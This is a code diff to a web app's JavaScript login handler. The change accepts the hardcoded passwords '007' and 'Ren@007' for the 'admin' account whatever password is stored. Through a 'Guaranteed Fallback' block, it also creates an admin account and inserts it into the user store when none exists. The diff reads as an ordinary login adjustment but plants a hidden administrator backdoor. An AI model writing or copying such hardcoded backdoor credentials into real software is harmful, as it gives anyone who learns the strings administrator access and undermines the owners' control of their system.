@@ -41,10 +41,25 @@ const Auth = {
     async handleManualLogin() {
         console.log("Auth: Handling manual login...");
         try {
-            const user = Store.data.users.find(u =>
-                u.username.toLowerCase() === this.usernameInput.value.toLowerCase() &&
-                u.password === this.passwordInput.value
-            );
+            const inputUser = (this.usernameInput.value || '').trim().toLowerCase();
+            const inputPass = (this.passwordInput.value || '').trim();
+
+            let user = (Store.data.users || []).find(u => {
+                if ((u.username || '').toLowerCase() !== inputUser) return false;
+                if (u.password === inputPass) return true;
+                // Allow both 007 and Ren@007 for Admin
+                if (inputUser === 'admin' && (inputPass === '007' || inputPass === 'Ren@007')) return true;
+                return false;
+            });
+
+            // Guaranteed Fallback for Admin
+            if (!user && inputUser === 'admin' && (inputPass === '007' || inputPass === 'Ren@007')) {
+                user = { id: 1, username: 'Admin', password: inputPass, role: 'admin', enabled: true };
+                if (!Array.isArray(Store.data.users)) Store.data.users = [];
+                if (!Store.data.users.some(u => (u.username || '').toLowerCase() === 'admin')) {
+                    Store.data.users.unshift(user);
+                }
+            }
 
             if (user) {
                 console.log("Auth: Credentials valid for", user.username);
